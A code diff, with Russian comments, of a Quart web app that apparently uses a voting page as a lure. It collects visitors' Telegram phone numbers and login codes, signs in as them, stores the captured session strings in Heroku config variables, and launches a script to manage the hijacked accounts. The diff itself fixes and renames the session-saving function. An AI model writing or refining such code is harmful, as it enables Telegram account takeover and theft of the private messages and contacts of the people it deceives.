@@ -46,13 +46,11 @@ async def create_telegram_client(session_str=None):
 async def send_code_with_delay(phone_number):
     try:
         logger.debug(f"Задержка перед отправкой кода для номера {phone_number}")
-        # Задержка 2 секунды перед отправкой кода
         await asyncio.sleep(2)
         result = await client.send_code_request(phone_number)
         logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
         return result
     except errors.FloodWait as e:
-        # Если превысили лимиты Telegram
         logger.error(f"Превышен лимит запросов, необходимо подождать {e.seconds} секунд.")
         await asyncio.sleep(e.seconds)
         return None
@@ -60,6 +58,7 @@ async def send_code_with_delay(phone_number):
         logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
         raise
 
+# Функция для получения сессии из Heroku
 def get_session_from_heroku(phone_number):
     try:
         heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
@@ -70,17 +69,17 @@ def get_session_from_heroku(phone_number):
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
         
-        # Проверка существования переменной окружения
         if env_var_name in config:
             return config[env_var_name]
         else:
             logger.error(f"Переменная окружения {env_var_name} не найдена.")
             return None
-
     except Exception as e:
         logger.error(f"Ошибка при получении сессии из переменной окружения Heroku: {e}")
         raise
-def set_session_to_heroku(phone_number, session_str):
+
+# Функция для сохранения сессии в Heroku
+def save_session_to_heroku(phone_number, session_str):
     try:
         heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
         app = heroku_conn.apps()[os.getenv('HEROKU_APP_NAME')]
@@ -90,11 +89,12 @@ def set_session_to_heroku(phone_number, session_str):
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
         
-        # Установка переменной окружения
+        # Сохранение сессии в переменной окружения
         config[env_var_name] = session_str
-        logger.debug(f"Сессия сохранена в переменную окружения Heroku: {env_var_name}")
+        logger.debug(f"Сессия успешно сохранена в Heroku для номера {phone_number}")
+
     except Exception as e:
-        logger.error(f"Ошибка при сохранении сессии в переменную окружения Heroku: {e}")
+        logger.error(f"Ошибка при сохранении сессии в Heroku: {e}")
         raise
 
 # Основная страница
@@ -113,7 +113,6 @@ async def vote(candidate):
 @app.route('/telegram-number', methods=['GET', 'POST'])
 async def telegram_number_route():
     if request.method == 'POST':
-        # Получение номера телефона
         phone_number = (await request.form)['phone_number']
         quart_session['phone_number'] = phone_number
         logger.debug(f"Получен номер телефона: {phone_number}")
@@ -128,7 +127,6 @@ async def telegram_number_route():
             else:
                 return "Превышен лимит запросов. Попробуйте позже."
             
-            # Переадресация на страницу ввода кода
             return redirect(url_for('verify_code'))
         except Exception as e:
             logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
@@ -141,7 +139,6 @@ async def telegram_number_route():
 @app.route('/telegram-code', methods=['GET', 'POST'])
 async def verify_code():
     if request.method == 'POST':
-        # Получение кода подтверждения
         verification_code = (await request.form)['verification_code']
         phone_number = quart_session.get('phone_number')
         phone_code_hash = quart_session.get('phone_code_hash')
@@ -161,14 +158,12 @@ async def verify_code():
                 logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")
 
                 # Сохранение сессии в переменной окружения на Heroku через API
-                get_session_from_heroku(phone_number, session_str)
+                save_session_to_heroku(phone_number, session_str)
 
                 # Запуск скрипта для управления аккаунтом
                 logger.debug(f"Запуск manage_account.py для номера {phone_number}")
                 subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)
 
-                # Переадресация на страницу успеха
-                logger.debug(f"Переадресация на страницу успеха для номера {phone_number}")
                 return redirect(url_for('success_page'))
 
             except Exception as e:
